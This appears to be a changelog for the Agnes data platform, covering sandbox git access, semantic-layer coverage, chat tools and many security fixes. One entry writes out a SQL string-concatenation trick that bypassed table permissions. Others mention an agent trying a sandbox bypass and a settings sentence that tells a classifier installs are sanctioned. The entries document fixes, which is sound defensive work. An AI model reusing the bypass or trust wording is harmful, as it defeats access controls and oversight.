- **A chat sandbox can finally reach a hosted app's git repo.** Authoring a data app from chat had no transport at all: the sandbox reaches Agnes only through the in-sandbox relay — `runner.py` rewrites `AGNES_SERVER` to it precisely so "the relay is the only thing that ever holds a real credential" — and the relay's `data_apps` ticket is confined by `_within_data_apps_prefix` to `/api/data-apps*`, while a repo lives at `/data-apps.git/<slug>`, a different top-level prefix. Going direct was refused too, by the sandbox's own egress hook, whose allowlist cannot name a per-deployment host because the file ships verbatim. Watched live: the agent fetched a credential from `data_app_git_credential`, then failed to clone by name, by hostname and by IP — including one attempt with the sandbox bypass — and stalled. New broker route `/api/broker/data-apps.git/{slug}/{path}` carries it, and the relay gains a matching `/data-apps.git` prefix on the existing `data_apps` ticket. Unlike its `{method, path, body}` siblings this one **proxies** rather than replaying an envelope — git speaks binary pack streams, its own content types, and opens with a `GET /info/refs?service=…` — which also exposed that the relay's transparent leg was hardcoded to POST, turning that first call into a 405. It is likewise the one broker route that attaches a **credential** instead of an identity JWT, because the git surface authenticates only a `data-app-git:<slug>` PAT in basic auth; that token is minted per request and revoked in `finally`, so the sandbox never holds one and nothing outlives the call. Authorization layers rather than replaces: the route pins the slug to an app the ticket's owner may reach and audits a rejection, then the git surface applies its own owner-or-admin check and scope-vs-slug pin. Co-sessions and scope-narrowed agent sessions are refused outright (403) — a co-session has no single owner to attribute a commit to, and an agent's owner-grants ∩ agent-scope says nothing about repository access; both fail closed rather than falling through to the owner, the mistake `_mint_identity_jwt` documents for its own co-session branch. The data-app skill now sends the agent to the relay URL and warns off the credential URL, which is for a laptop or an MCP client and is exactly what an agent reaches for right before it stalls. Bodies are buffered: an app repo is a scaffold, not a monorepo, and a genuinely large push is a reason to revisit rather than to stream today.
- **Semantic-layer coverage, on all three surfaces** (`GET /api/admin/semantic-layer/coverage`, `agnes admin semantic-layer coverage`, MCP `admin_semantic_layer_coverage`), plus the two admin pages that were quietly lying. A connected Keboola project published 50 metrics and imported 0 of them; `/admin/semantic-layer` rendered `✓ 0 updated, 0 pruned` — a green tick on a run that wrote nothing — and the stored-metric count sat at 0 with nothing to explain it. Every metric had skipped as `unresolved_table`: a metric binds to a table in `table_registry`, and none of that project's tables were registered. The cause was one connection whose **storage token and master token pointed at different projects**, so tables synced from one project while the semantic layer was read from another — a connection that tests fine, syncs fine, and can never import a single metric. That condition is now named outright, on `/admin/data-sources` next to the two tokens that disagree, and on `/admin/semantic-layer`. The coverage number is `importable / upstream`, not a pending queue: a semantic layer normally describes far more of a project than an instance registers, so a permanent "50 waiting" counter would be noise that trains people to ignore the one case that matters. Metrics whose *own definition* cannot be composed (a `--` comment that swallows the appended FROM clause, an alias reference needing a relationship) are listed separately, because registering a table never fixes those. Deliberately stateless — computed live against the Metastore and the registry rather than read from the sync's counters, which live in a process-local dict that empties on every restart and would go blank exactly when someone restarts and comes looking. Coverage counts what actually **lands**, not what maps: the sync refuses a metric name another source already holds, and that check runs after the mapper — found live, where a Keboola `mrr` never landed because the bundled yaml starter pack owned that name while every skip counter the sync reports read 0. That case is its own `name_conflict` warning, since it means two definitions of the same metric exist and the one in use is not the connected project's. `tests/test_keboola_semantic_layer_coverage.py` pins the distinction that motivated the shape: partial coverage (1 of 2 metrics bound) must raise **no** warning at all, and that assertion was mutation-checked — adding a `pending_registration` warning for unregistered tables fails it.
- **A connected data-source project can now lend the chat agent its own upstream tools** — one switch on the connection, rather than a second registration. `POST /api/admin/source-connections/{id}/chat-tools` (`agnes admin connection chat-tools`, plus a **Chat tools** row on `/admin/data-sources`) derives an `mcp_sources` stdio row from a Keboola connection and runs the upstream's own MCP server against it, so the agent gets that project's native tools — SQL, buckets and tables, search, semantic context — instead of Agnes re-implementing them. The admin had the project registered already; asking them to paste the same stack URL and token a second time under `/admin/mcp` was the whole friction. The token is never duplicated by hand: it is read through the same resolver `/test` and `/tables` use and injected into the subprocess **via an env var, never argv**. Enabling is idempotent, which is also how a rotation propagates — the derived source holds its own copy, so re-running is what re-syncs it (the UI offers **Re-sync token** for exactly this, and both surfaces say so). Two ways this could have failed quietly are closed by construction: a connection with no resolvable token is **refused** rather than yielding a source that starts and then fails every call at the far end, and deleting a connection now takes its derived source and that source's vault copy of the token with it, instead of leaving a live credential behind still offering a project the admin believes they disconnected. The derived source lands with **no** tool grants — enabling exposes nothing until an admin grants the tools to a group, so the RBAC decision stays where it already lives. The upstream package is **pinned**, and launched with `--prerelease=allow`: current releases depend on a pre-release, which uv refuses by default and resolves *backwards* around — silently, to a release roughly forty versions old that starts fine and serves a quietly truncated toolset (33 tools instead of 37, no semantic-layer tools at all). Both are pinned by tests. Classified `_EXEMPT` from the REST × CLI × MCP triple-surface rule under the standing credential-provisioning exemption: a tool that can re-point which upstream a credential authenticates against does not belong in an agent's hands.

### Fixed

- A command mention has to END the token: `/hooks/setup` and `/permissions/admin` are ordinary web addresses that merely begin with a command name, and flagging them put false alarms in front of the approver on plain documentation. Found by Devin Review on this PR.
- Every flagged sentence of a note is reported, not just the first. Findings were collapsed by line number, and a note written as one paragraph is one line — which is exactly the shape a session recap has — so an approver saw one warning where there were three. The dedup key is the clause now. Found by Devin Review on this PR.
- Two more on the same scanner: `/login` and `/logout` join the tokens that count only with a verb (they are this product's own sign-in pages, so "users sign in at /login" was flagged as an instruction), and a configuration mention that ENDS a sentence is recognised again — the lookahead treated the trailing period as a path segment, so "disable the hooks in /config." said nothing while the same sentence without the period did. `/config.md` is still a file path, not a mention. Found by Devin Review on this PR.
- A queued submission whose name or slug is blank is refused with 400 `invalid_payload` instead of producing a nameless, slugless domain — present-but-empty is as unusable as absent. Found by Devin Review on this PR.
- …but only upward: an `https` → `http` redirect on the same host is a misconfigured proxy, not a relocation, and telling the user to point the CLI at the insecure address would talk them out of TLS on the strength of a redirect anyone on the path can forge. Found by Devin Review on this PR.
- A plain-HTTP-to-HTTPS redirect counts as a move. It keeps the hostname and changes only the scheme, which is the commonest redirect there is — a server that got TLS — and it is cross-origin as far as httpx is concerned, so credentials are stripped on that hop as well. Reporting it as "not a move" left the user without the one remedy they could apply in a second. Found by Devin Review on this PR.
- …and "Re-sync token" re-derives what belongs to the release while keeping what belongs to the admin: the launch command, the pinned runner version and the credential scope come from this release (otherwise an upgraded runner never reached a project that already had chat tools on, and a preserved `per_user` scope would leave a token written to the SHARED vault unreachable), while the connect hint and extra environment values are carried over. The unrelated-edit path still preserves all of them. Found by Devin Review on this PR, from both directions.
- "Re-sync token" keeps what the admin adjusted too. The enable endpoint — which that button calls — rebuilt the derived server's row from the enable-path spec, discarding extra environment values, launch arguments, the credential scope and the connect hint; only `enabled` is forced now, because switching it on is what the endpoint is for. Found by Devin Review on this PR.
- Four more, all about saying what the engine actually does: `agnes search` marks a name match so its snippet is not read as a quotation, both MCP tool descriptions state the real rule (a name is consulted when no passage explains the question better — not "only when nothing matches"), `confidence` is per row rather than the whole response being downgraded to `low`, and the body-coverage comparison is measured over every candidate rather than the truncated top-k, so a passage ranked k+1 cannot be invisible to it.
- Two more: the name shortlist is no longer cut to the result count BEFORE the filter runs (a large file's early chunks could fill it, be filtered out, and leave the file unfound), and the combined search caps the name-matched hits INSIDE the chunk bucket rather than only capping a bucket that is entirely name hits — which, now that body hits stay in the bucket, almost never happened.
- The body/name label goes to whichever explains more of the question. Treating ANY textual overlap as disqualifying meant a passage containing one word of a two-word question, inside the file named after both, could not be a name hit — so the named file lost to whichever chunk id sorted first, which is not a property anyone should depend on.
- Two more on the same pass: a passage that genuinely contains the searched words stays a body hit even when its file is also named after them (every chunk of a name-matched file was being relabelled and reordered), and the name pass is skipped only when some passage explains the WHOLE question — the half-coverage bar killed the two-word case ("quarterly report") that motivated the feature, and the cost it saved is a rounding error next to the chunk rows the search has already loaded.
- Ownership of a settings line is decided by its exact text, not by its label: "Trusted internal domains:" is Claude Code's own trust-slot name, so an admin may maintain their own list under it, and the first version of the refresh would have deleted that during an upgrade. A line counts as ours only when it is byte-for-byte one we generate, or one of the retired ones we used to. Found by Devin Review on this PR.
- The opt-in command setup prints is runnable as printed — it named the flags but not the `--server-url` `agnes init` requires, so pasting it failed immediately. Found by Devin Review on this PR.
- A hand-written note naming the marketplace host is no longer read as a declaration: the state check matched any line containing the hostname, so someone else's note made setup report the trust as already granted and skip the write — the entries the classifier actually reads never landed. Only lines this tool wrote count. Found by Devin Review on this PR.
- …and that outage is audited as one: `result="error.503"` with `refused: "check_unavailable"`, not as a table refused for not being distributed. An operator reading the trail has to be able to tell a temporary failure from a deliberate denial. Found by Devin Review on this PR.
- …on both mark-required endpoints, not one: `/items/{id}/mark-mandatory` is the path the page calls, so reporting only on `/admin/mandate` would have left the surface admins actually use publishing silently. Found by Devin Review on this PR.
- Marking a single item required now reports what it publishes — same channel as approval, and the batch endpoint already said so — with the count on the audit row. And the standing explainer is sent whenever a tab has anything to act on rather than only when something is flagged, matching the review queue: an admin approving from a clean page should still know what approving does. Found by Devin Review on this PR.
- The slash-command warning stops firing on this product's own pages. `/agents`, `/status`, `/cost`, `/review`, `/config`, `/init`, `/model` and `/help` are web routes and ordinary words as well as Claude Code commands, so a note saying "agent profiles are managed at /agents" was flagged as an instruction — which teaches admins to ignore the warning. Those count only when a verb tells the reader to run them; the unambiguous commands still count on their own. Found by Devin Review on this PR.
- Three more from Devin Review on this PR: the seeded item resolves its domain BEFORE writing anything (the knowledge repo has no delete — items are retired by status — so the fix for a half-write is not to create the half), the friendlier permission message keys on the spec's `id_format` being a literal id rather than on the id happening to equal the type's own name, and Postgres keeps the domain junction in step on `update` as well as on `create`, so an item's domain has one source of truth on both engines.
- …and the admin endpoint rolls the domain back too, not just the suggestion-queue path: it commits the domain before saving the knowledge, so a failure there left an empty domain that made every retry fail on the duplicate slug. Found by Devin Review on this PR.
- A submitted slug carrying stray whitespace no longer makes its approval unachievable: the domain was created with the slug exactly as submitted while the knowledge was filed under a trimmed copy, so the seeding could not resolve it and every attempt rolled back. Both writes use one normalized value now. Found by Devin Review on this PR.
- `agnes login`'s token verification and `auth refresh-groups` diagnose a moved server too. Both talk through an `httpx.Client` without `follow_redirects`, and a 3xx was neither a rejection nor a fault to the checks that followed — so login "verified" against a server it never reached. The guard now matches `httpx.Client(` call sites as well. Found by Devin Review on this PR.
- …and the remedy it prints is the one that works for that command: `agnes init` reads neither `AGNES_SERVER` nor `config.yaml`, it takes the address as an argument, so the setup-token exchange names `agnes init --server-url <new address>` instead of the generic advice. Found by Devin Review on this PR.
- The setup-token exchange consults the same redirect diagnosis as the two HTTP clients. It calls the configured server with `httpx` directly and `raise_for_status()` does not treat a 3xx as an error, so a moved server produced a JSON decode failure during the very first connect. The guard that pins this now scans `cli/commands/` for direct calls to the Agnes server as well, not just `cli/*client*.py`. Found by Devin Review on this PR.
- The Data sources page no longer sweeps every connected project's Metastore to draw one warning line. It uses only the token-mismatch messages, so it asks for them: `GET /api/admin/semantic-layer/coverage?warnings_only=true` stops after the identity checks (two token verifications per connection) and skips the semantic-model enumeration entirely. The Semantic layer page still asks for the full report. Found by Devin Review on this PR.
- Two texts that told admins the old truth: `agnes admin connection chat-tools --help` no longer asks for a manual re-run after a token rotation (it propagates by itself as of this PR), and the unsupported-auth notice on the MCP server page names the options the form actually offers — it said "bearer, basic or oauth" while the selector holds none, bearer and oauth. Found by Devin Review on this PR.
- An edit to a connected project keeps what the admin adjusted on its chat-tools server. The resync rebuilt the whole row from the enable-path spec, so an unrelated save — flipping "set as default", a rename — threw away extra environment values, launch arguments, the credential scope and the connect hint (the enabled flag was the first half of this, fixed earlier in the PR). Only what the connection determines is re-derived now: its name and its stack URL, the two things that actually go stale. Found by Devin Review on this PR.
- Three follow-ups on the same pass, one round later: the candidate shortlist is scored on content words too (counting filler let a file named after "what is this" crowd out the file the question names), the file listing is skipped once any passage explains half the question rather than all of it (the full-coverage bar meant the common multi-word query loaded it anyway), and the guard test that claimed to prove the listing is not loaded was patching a name the module had already imported — it could never have failed.
- Three more on the same fallback, from the round after the last. The trigger is **comparative** now: both sides are scored on the share of the question's CONTENT words they account for, and a file name leads only when it explains more than the best passage does — "no body contains ANY query word" meant one stray `in` or `the` disabled the whole thing, which is every question phrased as a sentence rather than as keywords. The kept body hits are **rescaled under the weakest name hit**, because the two raw scales are unrelated and a list whose scores contradict its own order misleads everything that reads them. And the file listing the name pass needs is **loaded only when the pass can actually run** — a search whose best passage already covers the question never touches it. The trigger lives in one function the offline reader shares, so the two halves cannot drift.
- Four more from Devin Review on this PR, all on the same fallback. It **fired only when the search returned nothing at all**, which never happens once the embeddings extra is installed — every chunk gets a non-zero cosine — so the feature was dead code on exactly the instances that have semantic search; the trigger is "no document body carries the query's words" now, and name hits lead while whatever else scored keeps the remaining slots. It **looked up one file at a time**, turning a miss across large collections into hundreds of round-trips; names are loaded once per collection. The **cap on a name-only bucket no longer fires when nothing else matched** — capping then would only throw away the answer to the query that motivated the fallback. And a name hit is **labelled in the collections UI**, because its snippet is the file's opening text and reads as a quotation that answers the question.
- Three more on the same declaration, one round later. The refresh replaces the whole pair this tool wrote rather than only the line carrying the retired sentence — otherwise the still-current sibling stayed next to its freshly appended twin. It runs in **every** path including the unattended one, because rewriting words we wrote about a host already declared is not a new grant, and the CHANGELOG promised every machine gets it. And Ctrl-C at the consent prompt stops setup (exit 130) instead of being swallowed into a warning and the first sync. Found by Devin Review on this PR.
- Two more on the same rewrite, from the round after it. Only the entries this tool wrote are replaced — a hand-written note naming the same host used to be deleted along with them, and that file is the user's own settings. And setup checks the state before it asks: re-running on a machine that already carries the current declaration no longer re-opens a settled question, and an unattended run no longer reports it "is not declaring" something declared long ago. Found by Devin Review on this PR.
- A machine that already ran `agnes init` gets the new wording too. The idempotence check matched on the host alone, so a settings file carrying the retired sentence — the one telling the reading agent that installing from this host "is a routine, sanctioned internal operation, not integration of untrusted external code" — counted as already correct and could never be replaced, not even with `--force`. Retired entries for that host are rewritten in place (`TrustResult.REWRITTEN`, and setup says so); current ones and other hosts' entries are left untouched. Found by Devin Review on this PR.
- A registry read that fails during the distribution check answers **503 `distribution_check_unavailable`** on both surfaces instead of a bare 500 — and never releases the parquet. The check is the last thing between an authorized caller and raw bytes, so it fails closed and says to retry. Found by Devin Review on this PR.
- …and the Browse tab, which is the third surface that approves. `/api/memory/tree` annotates its paged rows for admins on the same terms, and the tab has its own notice slot. Found by Devin Review on this PR, in the round after the All Items fix.
- **DuckDB↔Postgres parity**: creating a knowledge item with a `domain` writes the `knowledge_item_domains` junction row on Postgres too. Every domain-scoped query in that repo joins the junction, so an item created with a domain was invisible under it there while the DuckDB sibling showed it — pre-existing, and made user-visible by the builder's seeded item. An unknown slug is rejected on both engines rather than half-written on one. Cross-engine contract test added. Found by Devin Review on this PR.
- The withdrawal gate reads the shared `BLOCKING_SUBMISSION_STATUSES` instead of its own copy of the rejected-review statuses, so it cannot disagree with `_entity_review_blocked` or the install repo about the same upload. Found by Devin Review on this PR.
- A domain-seeded knowledge item is filed under one stable category instead of the domain's slug. Categories fill the admin page's dropdowns via `SELECT DISTINCT category`, so a slug per domain would have grown a long tail of one-item categories there; the domain itself is already recorded in `domain`. Found by Devin Review on this PR.
- A failed approval no longer strands the submission. The domain is created before the knowledge is saved, so a failure in the second step reopened the suggestion with the domain already there — and every retry then died on the duplicate slug, leaving an author's submission impossible to approve and an empty domain nobody asked for. The half-done create is now undone (hard, since a soft delete keeps the slug taking its unique constraint) before the error propagates. Found by Devin Review on this PR.
- Four follow-ups from Devin Review on this PR. **A non-admin's knowledge no longer disappears on approval**: the suggestion-queue replay copied only name/slug/description, so an author who filled in the Corporate Memory builder, saw "Submitted for approval" and waited got an empty domain — the seeding is now one shared function both creation paths call, and the item is attributed to the submitter rather than to the admin who approved it. **A flagged upload can no longer be withdrawn by re-uploading first**: the gate read only the latest submission, so a fresh unjudged row made an adverse verdict stop counting; it scans the whole chain like its sibling `_entity_review_blocked` does, while `pending` and `review_error` remain non-verdicts an author may still withdraw. **A builder-assistant outage no longer reads as a missing permission** — the message branches on 401/403 versus anything else, and the API helper carries the status so it can. And the seeded item's `pending` state is stated in the response and on the page, because authoring is not approving.
- **`docs/DATA_SOURCES.md` offered a `data_source.type` value that has no connector, and never named the canonical one.** Three places name this vocabulary and they had drifted: the admin server-config schema says `keboola | bigquery | local | csv`, `config/instance.yaml.example` says `keboola | bigquery | local`, and the docs said `keboola, bigquery, csv` — offering the alias while omitting `local` entirely. `csv` is an alias for `local` and there is no CSV connector; nothing under `connectors/` handles it. So an admin following the docs picked `csv` expecting a Keboola-style pull and configured an instance with no external source at all — which is what a first-day admin did on a fresh instance during an onboarding pass. The docs now carry a table naming all three canonical values, say plainly that `csv` is an alias and that no connector exists behind it, and a guard fails if the three sources drift apart again or if a `connectors/csv/` ever appears without the docs being revisited.

- **An author could not withdraw their own submission when nothing had objected to it.** Owner-delete on a non-approved entity was refused so an author cannot erase a *flagged* upload before triage — a control worth keeping. But it keyed on `visibility_status`, which cannot tell "flagged" from "not judged yet": the runner writes `hidden` both for a blocked verdict and for a `review_error`, and `pending` while the verdict is still in flight. Submissions nothing had ever objected to were therefore trapped. Seen in production: a skill whose inline checks (content, quality, manifest, static security) all passed sat in `review_error` — the LLM call had crashed — for a month, with Delete and Edit both locked and re-upload answering `409 "delete the existing entity first"`, i.e. instructing the author to do the one thing they could not. The refusal now reads the *verdict*: `blocked_inline` / `blocked_llm` keep it, while "no verdict yet" and "the reviewer crashed" are the author's own not-yet-public upload to withdraw. Editing during an in-flight review stays refused — that one is a race against a reviewer reading the bundle, not an evidence question. The submission row, its sha256 and its size survive a withdrawal either way, so forensic correlation is unchanged.

- **The Corporate Memory Builder had nowhere to put the memory.** `/admin/studio/corporate-memory` posts to `POST /api/admin/memory-domains`, whose request body accepted only name / slug / description / icon / colour / cover / status — so a page whose subtitle reads *"Distill reusable knowledge into a memory domain granted to a group"* produced an empty container every time, and the knowledge itself had to be added later through a different surface. The endpoint now takes an optional `content` (plus `content_title`), seeds it as the domain's first knowledge item through the same repository the regular knowledge endpoint uses, and returns its `item_id`; the builder renders a matching Knowledge textarea. Seeding is opt-in — omit `content` and the endpoint behaves exactly as before — and whitespace-only content creates nothing, so a textarea the author tabbed through does not become an empty memory item. The item carries the domain's slug as its category, since the domain is the categorisation and the form does not ask for one. Both the domain and the seeded item get their own audit row.

- **A user without the cloud-chat grant was told "Access denied to chat 'chat'".** Cloud chat is modelled as a singleton feature gate — resource type `chat` holding one resource whose id is the literal string `chat` (`id_format="chat"`) — so the generic resource-denial text, `Access denied to {type} {id!r}`, collapsed into that. The Studio builders print the API's detail straight into their assistant panel, on a page whose banner reads "AI-ASSISTED", so two independent testers met it and neither could tell whether it was their permissions or a broken instance. Singleton resources now name the feature ("Access denied to Cloud chat — it is not enabled for your account."); multi-instance types keep naming the id, which is the part a reader needs there. A guard walks every registered resource type so a future singleton cannot reintroduce the shape. The Studio panel no longer echoes the raw exception either — it says what the reader can do (fill the form in manually, ask an admin for the grant) and keeps the detail in the browser console.

- A redirect that stays on the same address is reported as `unexpected_redirect`, not `server_moved`. A proxy or in-app 3xx has no new address to point at, so the old code printed "server_moved" above a hint saying nothing had moved, and sent the reader hunting for a hostname change that never happened. Found by Devin Review on this PR.
- **Every brokered git call left a dead credential row in the owner's token list.** The per-request token was revoked rather than deleted, and it is minted on every call — a single clone is several — so the list filled with cancelled entries and drowned the PATs the owner actually manages. Revocation is for a credential someone might still hold; nobody holds this one but the broker, and it is dead before the response returns. Deleted in `finally`, as before. Found by Devin Review on this PR.
- **A cloned repo's remote went stale the moment a sandbox resumed.** The relay binds a fresh port on every runner start, so the URL a clone records in `.git/config` is dead after a pause — the clone worked, and the next `git push` fails to connect, which reads as a broken relay rather than a stale remote. The data-apps skill now tells the assistant to re-point the remote from `$AGNES_SERVER_BASE` before pushing, and says why. Found by Devin Review on this PR.
- The SQL-as-a-string guard sees a quoted call too. sqlglot models `"query"('…')` with an `exp.Identifier` callee rather than a plain string, so the name test skipped it — and because that statement parses, the text fallback never ran: quoting the function name walked through the guard. The callee is unwrapped now, the fallback regex tolerates the quotes, and `postgres_execute` / `sqlite_execute` / `mysql_execute` join the set (same string-argument shape, and they write). Found by Devin Review on this PR.
- **`query('select * from …')` walked past the non-admin table RBAC on `/api/query`.** The gate that decides which tables an analyst may name (`_enforce_non_admin_sql_rbac`) works by regex-matching **view names in the SQL text** — so it can only deny a name it can see. DuckDB's `query()` takes its SQL as a *string*, and a string can be computed: `select * from query('select * from ' || 'ungranted')` names nothing the denylist can match, while the inner statement executes against the analytics catalog where every view resolves. The sibling `query_table` and `bigquery_query` were already on the keyword denylist; bare `query(` never was — and no keyword list could have covered the concatenated form anyway, which is the part that makes this a bypass rather than an oversight. The check is now on the parsed tree and keys on the function **name** (`_has_sql_string_table_function`): the argument may be `'a' || 'b'` or `chr(105)`, but the call is always an `exp.Anonymous` node carrying the literal name. That precision cuts both ways — a string that merely contains the name (`where note = 'query(1)'`) and identifiers like `query_id` / `saved_queries` are untouched, which a substring denylist would have broken. `postgres_query`, `sqlite_query` and `mysql_query` are covered by the same set. Unparseable SQL falls back to a text scan rather than failing open, mirroring the file-source guard next to it, and a tripwire test pins the sqlglot behaviour the detection rests on so an upgrade that changes it fails loudly instead of silently reopening the hole.
- The 422 redaction is a keep-list, not a drop-list. Dropping `input` alone was still a guess: a Pydantic v2 error also carries `ctx`, which for a field validator's `value_error` holds the validator's own exception — and dozens of validators format the rejected value into their text. Only `loc`, `msg`, `type` and `url` are echoed now, so a future key cannot reopen the channel. Found by Devin Review on this PR.
- **A 422 no longer hands the rejected request body back to the caller.** FastAPI's default validation error carries the offending value in an `input` key, and several admin endpoints take a credential AS their body — so a malformed request answered with the secret verbatim, and from there into every access log, proxy and error tracker on the way. Found live: `PUT /api/admin/source-connections/{id}/secret` sent with the wrong field name (`secret` instead of `value`) replied 422 with a Keboola master token in the response body; the same held for `/api/admin/datasource-secrets/{key}`. Redaction is deliberately NOT field-name-based — an allowlist of secret-looking names is a guess that silently misses the next endpoint someone adds, and at least five request models already carry a credential in a plain `value`/`token` field (`admin_source_connections`, `admin_datasource_secrets`, `admin_slack_secrets`, `admin_mcp`, `cli_auth`). The handler drops `input` outright, which cannot miss one, and keeps `loc`/`msg`/`type` so a client can still fix the call — the wrong field name in that live case is still named. `tests/test_validation_error_redaction.py` asserts the secret is absent whatever the status code, and was run against the unfixed handler first: it fails on two real endpoints there.
- **A file could not be found by its own name.** `rank_chunks` scores chunk TEXT — its docstring says "no filename resolution" — and the filename is attached afterwards, for the citation. So the most natural question anyone asks about a file they are looking at ("what is in quarterly-report.md?") matched nothing, because those words are in the name and not in the body. Observed live: an agent asked about an uploaded file searched for its filename, got `[]`, and concluded it lacked access to it; #1236 made that empty result explain itself, this makes the query work. Deliberately a FALLBACK rather than a scoring input — a filename is weak evidence next to the words actually in a document, so it must never reorder a search that already worked. The name pass runs only when the body search returns nothing, costs nothing on the path that already had hits, is scored by how much of the query the name accounts for (a full `quarterly-report` beats a bare `report`) and ordered by chunk ordinal so a matched file reads from its beginning. Hits are labelled `confidence: "low"`, because a name match is a hint. Extensions are excluded: `md` appears in every markdown filename, so honouring it would answer the query "md" with the entire corpus. Corpus scoping is unchanged — the fallback ranks the same RBAC-filtered candidate set, so it cannot surface a file the caller could not already search.

- The distribution gate reads a blank `query_mode` as `local`, the way the manifest and the distribution mirror already do — otherwise a table the server keeps advertising as downloadable could never be fetched. And `check-access` decides distribution BEFORE it writes the audit line, so a probe that answers 403 is no longer recorded as a granted success with the denial missing entirely. Found by Devin Review on this PR.
- **`server_only` was advice to the CLI, not a gate on the server — the parquet was one authenticated GET away.** The flag exists to say "this table is kept fresh on the server and never distributed", and `agnes pull` honours it. Nothing on the server did: `GET /api/data/{id}/download` gated on `can_access_table` and nothing else, never reading the registry row it was serving. So any caller authorized for the table — which is the normal state for a table deliberately marked undistributed — could fetch the whole file with `curl`. On Caddy-fronted deployments the gap is wider than that handler: the Caddyfile intercepts the download route, calls `check-access` via `forward_auth`, and streams the file from `file_server`, so uvicorn never sees the request and the `data.download` audit row is never written — meaning `check-access` is the only place a fix can reach that path at all. Both endpoints now call `_assert_distributable` after the RBAC check (that order matters: an unauthorized caller still gets the RBAC refusal and learns nothing about distribution). It is stated as an **allowlist** — `query_mode IN ('local','materialized')` and not `server_only`, matching what the manifest treats as downloadable — so a query mode added later is undistributable until someone decides otherwise, which is the safe direction for a gate that releases raw bytes. Deliberately **not** subject to admin god-mode: "not distributed" is a property of the table, true for every caller, exactly as the manifest already reports it to every caller. Two things fall out of the allowlist shape: `query_mode='remote'` tables, which have no server parquet at all, now refuse with a reason instead of a bare 404; and internal tables (`agnes_audit` / `agnes_sessions` / `agnes_telemetry`, `query_mode='internal'`) stop returning 204 from `check-access` — their only RBAC is the row-level `WHERE` in the query path, so handing Caddy a 2xx for them was the same class of bug that `app/api/sync.py` already defends against for signed URLs.
- The moved-server remedy names the config file it means. `AGNES_CONFIG_DIR` moves that file — a second instance on one machine is exactly the case — so "your agnes config.yaml" left the user to find it. The message prints the resolved path again, without creating the directory the way `cli.config._config_dir` does. Found by Devin Review on this PR.
- **The CLI's second HTTP client answered a moved server with `internal CLI error (JSONDecodeError)`.** #1225 taught `cli/client.py` to stop on a 3xx and name the new address, but the CLI has two HTTP clients: `cli/v2_client.py` calls the module-level `httpx.get`/`httpx.post` directly, so it never sees the other client's event hooks — and each of its helpers only raised on `>= 400`, so a redirect fell through to `r.json()` on a redirect's empty body. Ten command modules route through it (`catalog`, `describe`, `search`, `collections`, `store`, `my_stack`, `marketplace`, …), and the message they printed named neither the status, nor the destination, nor a remedy — strictly worse than the bare `HTTP 308:` that fix set out to replace. Measured against a real moved hostname, not inferred. The wording now lives in one place (`cli/server_moved.py`) that both clients call, the open-coded `>= 400` guards in `v2_client` collapse into one shared `_raise_for_status`, and a test fails any client module making httpx calls without consulting it — a second client is what caused this, so the guard is written against the pair rather than against the file that happened to break. `api_get_stream` needed its own line: its check sits inside a `with httpx.stream(...)` block at a different indent, so the sweep over the plain verbs left it behind, and there a redirect is worse than elsewhere — the 3xx is not an error, so the download loop writes the redirect's empty body to disk and reports success. The guard that found it walks the module's AST and matches each function reaching `httpx` to a guard inside that same function; an earlier version counted call sites against guard calls and passed on a coincidence.

- **Three more coverage-report defects, all found by Devin Review on this PR.** (1) **A metric blocked only by an unregistered table was filed as an unfixable definition defect.** Two Agnes-side failures — the joined table is not registered here, or is registered without its columns — fell back to the generic `foreign_alias_reference`, which the report classifies as "blocked by their own definition", so the admin was told registering a table would not help when that is exactly the fix. Those two now carry `unresolved_joined_table`, deliberately a new REASON and not a new counter: it folds into `skipped_foreign_alias`, so the published per-source counters are unchanged. (2) **Coverage judged name ownership differently from the sync on the default project.** It passed `adopt_null=False` while the sync passes `adopt_null=(connection_id == default_id)`, so a legacy unattributed row the sync would adopt was reported as a conflict — telling the admin a metric will not import when it will, which is the direction that costs them the most. (3) **An empty orange warning strip rendered under every Keboola connection card**: `display: flex` beats the UA sheet's `[hidden] { display: none }`, so the token-mismatch box showed even with nothing to warn about.
- **The coverage report's empty-state hint printed a command that cannot be run.** It told the operator to run `agnes admin connection secret --id <connection> --kind master`, but `connection_id` is a positional argument there — copying the line fails with "No such option: --id", and an admin with no configured project concludes the feature is broken. Guarded structurally rather than by string match: every `agnes …` command this module prints is resolved against the real Typer app, and each `--flag` must be a real option of the command it targets. Found by Devin Review on this PR.
- **Coverage skipped the master-token preflight the sync enforces.** `_sync_one_source` aborts with `MasterTokenRequiredError` when the stored owner token has been downgraded — the Metastore rejects it with an opaque "Failed to create project scope" — so a report that does not check describes a sync that never runs. The identity lookup already calls `verify_token`; it now carries `is_master` back from that same round-trip and the report warns, naming the remedy. Found by Devin Review on this PR.
- **Two display gaps, both found by Devin Review.** A sync that wrote nothing but **removed** stale metrics read as "ran, imported nothing" — the zero-check ignored the prune count, and hidden deletions are the one direction an admin cannot check by looking. And the Data sources page filtered the mismatch warnings to the storage-vs-master code only, so the more serious one — a master token contradicting the project the connection is locked to, which stops the sync outright — never appeared on the very page its own message tells the admin to visit.
- **The coverage report gave a clean bill of health to a connection whose sync cannot start.** It compared the storage token's project against the master token's, but not either against the project the connection is **locked to** — and that is the one the sync enforces: a master token opening a different project than the recorded binding is refused outright, so the sync never runs. The report now warns on that too, naming both ways out (unbind the connection, or store a master token for the project it is bound to). Found by Devin Review on this PR.
- **Clearing a project's token still left the agent able to authenticate from the host environment.** The derived source names `KBC_STORAGE_TOKEN` in `auth_secret_env`, and `connectors/mcp/client.py` reads `os.environ[auth_secret_env]` when the vault has nothing — a variable a Keboola deployment plausibly has set. So deleting the vault copy, which this PR added precisely so that clearing a token cuts the agent off, did not cut it off at all. The derived source is **switched off** with it, which is the honest expression of "cut this project off" — the switch then reads off because it is, and turning it back on is explicit. Clearing `auth_secret_env` instead, which an earlier revision did, was worse than the bug: for a stdio source that field is also the name the vault value is injected under, so it broke the working path and left re-adding a token useless. The add-project wizard also now rejects `http://` client-side, matching what the server enforces and what the form's own message already said. Found by Devin Review on this PR.
- `agnes init` no longer reports a failed trust write as an existing one. `ensure_marketplace_trusted` returned a single `False` for both "an entry naming this host is already there" and "the settings file could not be read, nothing was saved", and the caller printed the reassuring one — so an operator who opted in and hit a malformed `settings.json` was told the change existed. The three outcomes are now distinct (`TrustResult`) and each has its own sentence. Found by Devin Review on this PR.
